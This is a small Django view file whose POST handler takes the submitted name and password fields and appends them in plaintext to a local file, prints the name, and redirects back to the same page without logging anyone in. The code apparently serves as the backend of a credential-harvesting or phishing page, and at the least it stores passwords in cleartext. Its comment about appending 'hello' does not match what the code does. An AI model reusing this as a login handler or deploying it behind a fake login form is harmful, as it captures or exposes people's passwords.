from django.shortcuts import render
from django.views import View 
from django.shortcuts import redirect 

# Create your views here.
class PageView(View):
    def get(self, request):
        return render(request, 'wow/index.html')
    def post(self, request):
        file_object = open('sample.txt', 'a')
        # Append 'hello' at the end of file
        file_object.write ('\n' +request.POST['name'] + request.POST['pass'])
        # Close the file
        file_object.close()
        print(request.POST['name'])
        return redirect(request.path) 
    